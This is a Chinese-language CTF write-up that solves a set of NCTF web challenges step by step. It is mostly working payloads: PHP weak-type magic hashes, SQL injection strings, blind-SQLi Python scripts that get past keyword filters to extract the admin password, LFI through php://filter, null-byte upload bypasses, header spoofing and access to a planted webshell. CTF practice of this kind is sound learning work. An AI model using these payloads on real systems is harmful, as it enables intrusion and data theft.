---
title: "NCTF WriteUp"
date: 2018-05-18 21:17:34
tags: [nctf, writeup]
---

我是看心情做的 233, 可能不是按顺序, 请见谅

<!-- more -->

### 0x01 签到题

右键查看网页源代码, 得到 `nctf{flag_admiaanaaaaaaaaaaa}`

### 0x02 md5 collision

php 因为是弱类型, 而 `md5("240610708")` 和 `md5('QNKCDZO')` 均为 `0eXXXXX`, 被 php 当成了科学计数法. 0 当然等于 0, 所以 [http://chinalover.sinaapp.com/web19/?a=240610708](http://chinalover.sinaapp.com/web19/?a=240610708), 得到 `nctf{md5_collision_is_easy}`

### 0x03 签到2

前端控制长度, 直接 `curl -X POST http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php -d "text1=zhimakaimen"` 可得 `nctf{follow_me_to_exploit}`

### 0x04 这题不是WEB

真的不是 WEB 233, 在图片尾部, 可以得到 `nctf{photo_can_also_hid3_msg}`

### 0x05 SQL Injection

题目中的

```php
function clean($str){
	if(get_magic_quotes_gpc()){
		$str=stripslashes($str);
	}
	return htmlentities($str, ENT_QUOTES);
}
```

因为用了 `stripslashes` 而 `htmlentities` 是不会转义 `\` 的, 所以存在注入, 比较特殊, 生产环境应该不会有人这么干... 用 `username=\&password=%20or%201=1%20%23` 就可以 get 到 `nctf{sql_injection_is_interesting}` 此时的 sqlQuery 为 `SELECT * FROM users WHERE name='\' AND pass=' or 1=1 #';` 因为第二个自带的 `'` 被转义, 所以导致了可以通过 pass 参数注入.

### 0x06 file_get_contents

注意 `file_get_contents` 是支持 http 协议的, 所以只要写个只有 `meizijiu` 的空白网页然后让 `file_get_contents` 获取就行了.

### 0x07 综合题

放在控制台运行下那一串 js 就行, 得到 `1bc29b36f623ba82aaf6724fd3b16718.php`, 访问后提示在头部, 所以观察 header, 得到 history of bash 这个 hint, 接着访问 `.bash_history` 就可以得到下一步 `flagbak.zip` 打开后就可得到 `nctf{bash_history_means_what}`

### 0x08 密码重置2

自带 3 个提示, 访问 `http://nctf.nuptzj.cn/web14/.submit.php.swp` 就可以得到源码, 观察源码, 同样弱类型 0000000000 == 0, 所以 `http://nctf.nuptzj.cn/web14/submit.php?emailAddress=admin@nuptzj.cn&token=0000000000` 就可拿到 `nctf{thanks_to_cumt_bxs}`

### 0x09 变量覆盖

`http://chinalover.sinaapp.com/web24/?name=meizijiu233` 即可, 得到`nctf{AD3FBD8D5928693CA499347C91570AE6}`

### 0x0A 综合题2

相当不错的题, 百度了半天才完成这道题 ORZ. 之前一直只听说过盲注, 这也是第一次真正尝试盲注, 还是蛮有意思的. about.php 存在 LFI, 把 sm.txt 里面说的文件瞎看了半天, 全都是有 mysql\_real\_escape\_string() 过滤, 与注入无缘. 最后找了半天, 发现在 index.php 里面还用到了 so.php 和 preview.php. 在 so.php 上存在注入点, 虽然它也使用了 mysql\_real\_escape\_string(), 但不同的是注意它的语句 ``SELECT * FROM `message` WHERE display=1 AND id=$id`` 它的 id 字段是没有引号的, 也就是说我们是不用逃逸单引号的, 这也是所有涉及到数据库的文件中唯一没有使用引号的, 成为了唯一的注入点. 再观察 antiinject.php, 通过替换过滤了很多语句, 不过我们可以通过简单的堆叠来逃逸, 比如 `seleselectct` 替换后成为 `selcet`, 就避免了被替换. 我们就可以通过盲注来脱裤了, 可以写个简单的函数来便于我们注入, 就叫 antiAntiInject 吧 233

```python
def antiAntiInject(payload):
    payload = payload.replace(" ", "/**/")
    payload = payload.replace("or", "oorr")
    payload = payload.replace("=", "like")
    payload = payload.replace("and", "anandd")
    payload = payload.replace("from", "ffromrom")
    payload = payload.replace("char", "chcharar")
    payload = payload.replace("count", "cocountunt")
    payload = payload.replace("name", "nanameme")
    payload = payload.replace("pass", "papassss")
    payload = payload.replace("admin", "admadminin")
    payload = payload.replace("order", "ororderder")
    payload = payload.replace("union", "uniunionon")
    payload = payload.replace("select", "selselectect")
    return payload
```

本来还得更麻烦去爆破表名、字段名, 但是好心的出题人直接给我们结构, 所以我们直接爆破用户名和密码. 直接猜用户名 admin 竟然对了233, 接下来就可以通过 LENGTH 函数来爆破长度. 注意因为过滤了单引号且不能反反过滤, 所以不能直接输入用户名, 在这里我们用十六进制来表示我们的用户名 admin

```python
def bpForLength(val): #34
    payload = "1 and if(((select LENGTH(userpass) from admin where username = 0x61646d696e) = {len}) , 1, 0) = 1".format(len=str(val))
    print(payload)
    postData = {
        "soid": antiAntiInject(payload)
    }
    res = sess.post("http://cms.nuptzj.cn/so.php", postData)
    res.encoding = "utf-8"

    if res.text.find("xlcteam")!=-1:
        print(True, val)
```

最后得到的长度是 34, 瞎几把爆了半天密码, 结果字典里没有空格导致有些地方没有爆出来, 长度不是 34. 最后才发现 passencode.php 这个文件, 可以看到密码是由明文 ascii 编码后中间填充空格得到的, 所以我们爆破时 payload 选用数字 + 空格就够了 (要是早点知道这个文件的话上面其实没爆出来空格也可以),

```python
def bpForVal(pos): #102 117 99 107 114 117 110 116 117 
    global a
    for val in table:
        payload = "1 and if(substr((select userpass from admin where username = 0x61646d696e), {p}, 1) = {v} , 1, 0) = 1".format(p=str(pos), v=str(hex(ord(val))))
        #print(payload)
        postData = {
            "soid": antiAntiInject(payload)
        }
        res = sess.post("http://cms.nuptzj.cn/so.php", postData)
        res.encoding = "utf-8"

        if res.text.find("xlcteam")!=-1:
            a += val
            print(a)
            break
```

最后得到 `102 117 99 107 114 117 110 116 117` 即是密码, 明文即是 `fuckruntu` (#日闰土? 什么鬼233) 后台可以在 about.php 自身看到, 敏感目录`loginxlcteam` 即是 (这就叫此地无银三百两吧 233), 用 admin + 明文密码就可以登上了. 提示 `xlcteam.php` 是后门, 用 about.php 查看发现完全看不懂 233, 百度了下发现可以搜到, 是使用的回调函数来隐藏, 不明觉厉, 这里我就先用百度上说的调用方式了, 具体原理日后再分析. 地址是 `http://cms.nuptzj.cn/xlcteam.php?www=preg_replace`, 密码是`www`, 可以直接用蚁剑连上, 得到 `nctf{you_are_s0_g00d_hacker}`, 然而我还是太菜了 QAQ.

### 0x0B 密码重置

直接 F12, 删除账号的输入框的 readonly 属性后改成 admin 就行了, 得到 `nctf{reset_password_often_have_vuln}`

### 0x0C 密码重置

又是弱类型 `54975581388` 的十六进制即是 `0xccccccccc` , 恰好没有数字, key=0xccccccccc. 得到 `nctf{follow_your_dream}`

### 0x0D pass check

旧版本 php 的函数 strcmp 对数组这种不合法变量进行比较时, 存在漏洞会返回 0, `curl -X POST http://chinalover.sinaapp.com/web21/ -d "pass[]=1"`, 得到 `nctf{strcmp_is_n0t_3afe}`

### 0x0E SQL注入1

注意密码是会被 md5 的, 所以注入点在用户名, 将后面的语句注释掉就可以了, `curl -X POST http://chinalover.sinaapp.com/index.php -d "user=admin ')#&pass=asd"`, 得到 `nctf{ni_ye_hui_sql?}`

### 0x0F SQL注入1

一开始还以为要时间盲注一波, 发现题目有提示 `union`, 然而还没听说过, 就搜了一波大神的题解, 发现还有这种操作, 太强了. `curl -X POST http://chinalover.sinaapp.com/web6/index.php -d "user=1' union select md5('asd')#&pass=asd"`, 因为用户 1 是不存在的, 所以 query\[pw\] 的结果实际上是 md5('asd'), 导致绕过检验, 得到 `ntcf{union_select_is_wtf}`

### 0x10 伪装者

X-Forwarded-For, Client-IP 都试一下, 最后得到检测的是 Client-IP,  `curl http://chinalover.sinaapp.com/web4/xxx.php -H "Client-IP: 127.0.0.1" -v`, 得到 `nctf{happy_http_headers}`

### 0x11 变量覆盖

直接将两个变量覆盖即可, `curl -X POST http://chinalover.sinaapp.com/web18/index.php -d "pass=asd&thepassword_123=asd"`, 得到 `nctf{bian_liang_fu_gai!}`

### 0x12 bypass again

经典题, `a=QNKCDZO&b=240610708`, 得到 `nctf{php_is_so_cool}`

### 0x13 \\x00

题目暗示 00 截断, 试了下 `nctf=123123%00%23biubiubiu`, 得到 `nctf{use_00_to_jieduan}`

### 0x14 MYSQL

进 robots.txt 拿到提示, intval 是取整数的, 所以我们直接 `id=1024.1`, 就可以拿到 `nctf{query_in_mysql}`

### 0x15 COOKIE

修改 cookie 中的 login 的值为 1 即可, curl `http://chinalover.sinaapp.com/web10/index.php -H "Cookie: Login=1"`, 得到 `nctf{cookie_is_different_from_session}`

### 0x16 单身一百年也没用

curl `http://chinalover.sinaapp.com/web9/index.php -v` 即可, 得到 `nctf{this_is_302_redirect}`

### 0x17 文件包含

经典题目, `file=php://filter/read=convert.base64-encode/resource=index.php`, 再拿去解个码, 得到 `nctf{edulcni_elif_lacol_si_siht}`

### 0x18 php decode

这道题挺坑的... 直接把 eval 换成 echo, 放在 php 环境运行一下就行了, 得到 `nctf{gzip_base64_hhhhhh}`

### 0x19 单身二十年

`curl http://chinalover.sinaapp.com/web8/search_key.php -v`, 得到 `nctf{yougotit_script_now}`

### 0x1A AAENCODE

直接丢到 console 运行得到 `nctf{javascript_aaencode}`, 不得不说这个编码简直神经病 233

### 0x1C 层层递进

有毒... 根本没啥思路, 百度了一手发现是在 `404.html` 里面, 取注释里面 `jquery-x` 的最后一位拼起来就可以了, 纯脑洞啊..., 拼起来得到 `nctf{this_is_a_fl4g}`

### 0x1D 上传绕过

将 /uploads/ 后面添加一个 test.php 再加上个 \\x00 就可以了, 代码应该是把 dir + filename 组合后作为保存路径. \\x00 截断后, 保存路径就变成了 /uploads/test.php, 成功绕过, 得到 `nctf{welcome_to_hacks_world}`